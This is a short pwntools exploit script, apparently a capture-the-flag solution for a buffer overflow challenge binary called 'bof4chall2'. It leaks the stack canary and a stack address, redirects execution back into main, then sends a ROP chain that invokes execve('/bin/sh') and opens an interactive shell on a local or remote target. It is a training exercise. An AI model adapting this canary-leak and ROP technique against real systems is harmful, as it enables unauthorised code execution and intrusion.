#!/usr/bin/env python3

from pwn import *

exe = ELF("./bof4chall2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*vuln+65
                   b*vuln+162
                   c
                   ''')
        input()
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    payload = b"a" * 50
    r.sendafter(b"name ?\n", payload)
    r.recvuntil(b"a" * 48)
    canary = u64(r.recv(8)) - 0x61
    log.info("canary: " + hex(canary))
    stack = u64(r.recv(6) + b"\0\0")
    log.info("stack: " + hex(stack))
    ow_canary = stack - 56
    log.info("addr canary: " + hex(ow_canary))

    r.sendafter(b"rop ?\n", p64(ow_canary))

    payload = p64(canary) + b"a" * 40 + p64(exe.sym['main'] + 5)
    r.sendafter(b"enabled?\n", payload)

    pop_rdi = 0x00000000004013b3
    pop_rdx = 0x00000000004011f6
    pop_rsi = 0x00000000004013b1
    pop_rax = 0x00000000004011fa
    syscall = 0x00000000004011f8
    binsh = stack - 72
    shell = flat(
        pop_rdi, binsh,
        pop_rdx, 0,
        pop_rsi, 0, 0,
        pop_rax, 0x3b,
        syscall,
        0x3b

    )
    payload = b"a"
    payload += b"/bin/sh\0"
    payload += b"a" * 8 + p64(canary)
    payload = payload.ljust(65)
    payload += shell
    r.sendafter(b"name ?\n", payload)

    r.sendafter(b"rop ?\n", b"a")
    r.sendafter(b"enabled?\n", b"b")
    r.interactive()


if __name__ == "__main__":
    main()